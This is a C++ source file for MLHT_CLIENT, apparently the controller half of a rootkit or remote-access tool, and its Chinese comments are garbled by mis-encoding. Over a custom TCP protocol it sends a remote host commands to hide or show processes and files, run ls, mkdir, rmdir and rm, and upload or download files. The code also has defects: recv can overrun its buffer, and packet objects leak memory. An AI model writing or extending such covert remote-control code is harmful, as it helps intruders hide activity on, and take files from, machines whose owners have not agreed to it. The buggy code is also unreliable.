#include"MLHT.h"
#include<stdio.h>


#define IP_ADDRESS_LENGTH 16
#define SOCKET_BUFFER_SIZE (MLHT_MAX_LENGTH + 1)


//���Ľ��շ���ֵ
#define PACKET_ACCEPT_SUCCESS	0
#define PACKET_ACCEPT_FAIL		1
#define FILE_OPEN_FAIL			2

#define FILE_READ_FAIL			3
#define FILE_WRITE_FAIL			4
#define FILE_LS_FAIL			5

#define NOT_GET_ACK				6
#define GET_ACK					7


class MLHT_CLIENT
{
public:
	WSADATA wsaData;
	SOCKET s;
	sockaddr_in sockaddr;
	char server_ip[IP_ADDRESS_LENGTH];
	int server_port;

	char buffer[MLHT_MAX_LENGTH];

	WORD IDtt;
	
	MLHT *p_send;//��һ�������ı���
	MLHT *p_get; //��һ���յ��ı���

public:
	MLHT_CLIENT(char* ip,int port){

		IDtt = 1;

		p_send = new MLHT();
		p_get = new MLHT();


		WSAStartup(MAKEWORD(2, 2), &wsaData);//������������Ӧ�ó����DLL���õĵ�һ��Windows Sockets������
		//������Ӧ�ó����DLLָ��Windows Sockets API�İ汾�ż�����ض�Windows Socketsʵ�ֵ�ϸ�ڡ�
		//Ӧ�ó����DLLֻ����һ�γɹ���WSAStartup()����֮����ܵ��ý�һ����Windows Sockets API����

		s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr.sin_family = PF_INET;

		strcpy_s(server_ip,strlen(ip)+1,ip);
		sockaddr.sin_addr.S_un.S_addr = inet_addr(ip);

		server_port = port;
		sockaddr.sin_port = htons(server_port);

	}

	//���ӷ����
	bool ConnectServer(){

		int ret = connect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));

		if(WaitForAckPacket()==PACKET_ACCEPT_SUCCESS)
			return true;
		else
			return false;

	}

	//�ȴ����ر��ģ���ⷵ�ر����Ƿ�Ϸ�
	int WaitReturnPacket(){
		
		ZeroMemory(buffer, sizeof(buffer));

		if(recv(s, buffer, SOCKET_BUFFER_SIZE, NULL) != SOCKET_ERROR){
			if(p_get->PacketAccept(((BYTE*)buffer)))
				return PACKET_ACCEPT_SUCCESS;
			else
				return PACKET_ACCEPT_FAIL;
		}
		
		return SOCKET_ERROR;

	}

	//�ȴ�ACK���ر���
	int WaitForAckPacket(){

		int ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		if(p_get->PacketAnalyze_SYNACKFIN()!=MLHT_MTU_TYPE_ACK)
			return NOT_GET_ACK;

		return PACKET_ACCEPT_SUCCESS;

	}

	//��ACK���ر���
	void SendACKPacket(){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(p_get->GetPacketId(),MLHT_MTU_TYPE_ACK|p_get->GetPacketType());
		p_send->PacketSplice((BYTE*)buffer);
		send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

	}

	//��FIN���ر���
	void SendFINPacket(){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(p_get->GetPacketId(),MLHT_MTU_TYPE_FIN|p_get->GetPacketType());
		p_send->PacketSplice((BYTE*)buffer);
		send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

	}

	//���޲�������
	int SendPacket(WORD mtu_type){

		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(IDtt++,mtu_type);
		p_send->PacketSplice((BYTE*)buffer);
		send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

		return WaitForAckPacket();

	}

	//������������
	int SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength){
		
		ZeroMemory(buffer, sizeof(buffer));

		p_send = new MLHT(IDtt++,mtu_type,slicenum,slicesum,(BYTE*)content,contentlength);
		p_send->PacketSplice((BYTE*)buffer);
		send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//���ͱ���

		return WaitForAckPacket();
	}

	//�����ļ���
	int SendFilePacket(
		WORD mtu_type,			//�ļ�����Э������
		char*srcfiledir			//�ļ�·��
		)
	{
		int ret;

		FILE *fp = NULL;//�����ļ�ָ��
		if (fopen_s(&fp,srcfiledir,"rb") != NULL)//���ļ�
			return FILE_READ_FAIL;
		
		
		//�����ܷ�Ƭ��
		fseek(fp,0L,SEEK_END);			// ��λ���ļ�ĩβ
		int contentlen = ftell(fp);		//����ָ��ƫ���ļ�ͷ��λ��(���ļ����ַ�����)
		WORD slice_sum = contentlen/MLHT_SLICE_FILE_LENGTH;
		if(contentlen % MLHT_SLICE_FILE_LENGTH)
			slice_sum++;
		
		char p[MLHT_SLICE_FILE_LENGTH]={0};//�ļ�ָ��


		//��Ƭ1->n-1: ��ͻ���/�����������ļ���Ƭ
		for(WORD slice_num = 1;slice_num < slice_sum;slice_num++){

			fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_num-1),SEEK_SET); // ˳��λ�ļ�ָ��
			fread(p,MLHT_SLICE_FILE_LENGTH,1,fp);					 // ���ļ�ָ�뿪ʼ��

			ret = SendPacket(mtu_type,slice_num,slice_sum,p,MLHT_SLICE_FILE_LENGTH);
			if(ret != PACKET_ACCEPT_SUCCESS)
				return ret;
		}


		//��Ƭn ����ͻ���/���������ͽ�β��Ƭ
		fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_sum-1),SEEK_SET); // ˳��λ�ļ�ָ��
		fread(p,contentlen%MLHT_SLICE_FILE_LENGTH,1,fp); // ���ļ�ָ�뿪ʼ��

		ret = SendPacket(mtu_type,slice_sum,slice_sum,p,contentlen%MLHT_SLICE_FILE_LENGTH);
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;

		return PACKET_ACCEPT_SUCCESS;

	}


	//�����ļ���
	int GetFilePacket(
		char* desfilename		//�����ļ���Ŀ��·��
		)
	{

		int ret;

		FILE* fp = NULL;

		do{
			ret = WaitReturnPacket();
			switch(ret)
			{
			case PACKET_ACCEPT_SUCCESS:
				{
				    fopen_s(&fp,desfilename,"ab");
					if(fp != NULL) //����һ����׷����ʽ�������д���ļ���
					{
						//��������Ƭ��������׷�ӵ���ʽд���ļ���
						if(fwrite(p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH, 1, fp)!= 1){	
							//printf("%d	",errno );
							return FILE_WRITE_FAIL;
						}
						else{
							//printf("Get packet %d,Total %d packets...\n",p_get->GetPacketSliceNum(),p_get->GetPacketSliceSum());
							SendACKPacket();
							//printf("Send ACK packet back...\n");
							fclose(fp);
						}
					}
					else{
						//printf("%d	",errno );
						return FILE_OPEN_FAIL;
					}
				}
				break;
			default:
				return ret;
			}
		}while(!p_get->IsLastPacket());

		return PACKET_ACCEPT_SUCCESS;
	}
					

	//������ʾ
	void ShowProcess(){
		SendPacket(MLHT_MTU_TYPE_PROCESS_SHOW);
	}

	//��������
	void HideProcess(){
		SendPacket(MLHT_MTU_TYPE_PROCESS_HIDE);
	}

	//�ļ���ʾ
	void ShowFile(){
		SendPacket(MLHT_MTU_TYPE_FILE_SHOW);
	}
	
	//�ļ�����
	void HideFile(){
		SendPacket(MLHT_MTU_TYPE_FILE_HIDE);
	}

	//Shell����
	int ShellLs(char* filedir){
		char a[]={0};
		SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,filedir,strlen(filedir)+1);
		//SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,a,strlen(a)+1);
		int ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		if(p_get->PacketAnalyze_SYNACKFIN()==MLHT_MTU_TYPE_FIN)
			return FILE_LS_FAIL;
		else{
			SendACKPacket();
			return PACKET_ACCEPT_SUCCESS;
		}

	}


	int ShellMkdir(char* filedir){
		SendPacket(MLHT_MTU_TYPE_SHELL_MKDIR,1,1,filedir,strlen(filedir)+1);
		return WaitForAckPacket();
	}


	int ShellRmdir(char* filedir){
		SendPacket(MLHT_MTU_TYPE_SHELL_RMDIR,1,1,filedir,strlen(filedir)+1);
		return WaitForAckPacket();
	}


	int ShellRm(char* filename){
		SendPacket(MLHT_MTU_TYPE_SHELL_RM,1,1,filename,strlen(filename)+1);
		return WaitForAckPacket();
	}


	//�ϴ��ļ�
	int UpLoadFile(
		char*srcfiledir, //�ϴ���Դ�ļ�·��
		char*desfiledir  //�ϴ���Ŀ���ļ�·��
		)
	{
		int ret;

		//�����������Ŀ���ַ
		ret = SendPacket(MLHT_MTU_TYPE_SHELL_UPLOAD,1,1,desfiledir,strlen(desfiledir)+1);
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		//������������ļ���
		return SendFilePacket(MLHT_MTU_TYPE_SHELL_UPLOAD,srcfiledir);
	}

	
	//�����ļ�
	int DownLoadFile(
		char*srcfiledir,//�����ļ�·��
		char*desfiledir //�浽�ı���Ŀ¼·��
		)
	{
		int ret;
		//���������ļ�����
		ret = SendPacket(MLHT_MTU_TYPE_SHELL_DOWNLOAD,1,1,srcfiledir,strlen(srcfiledir)+1);
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;
		//�ӷ����������ļ�
		return GetFilePacket(desfiledir);
	}

};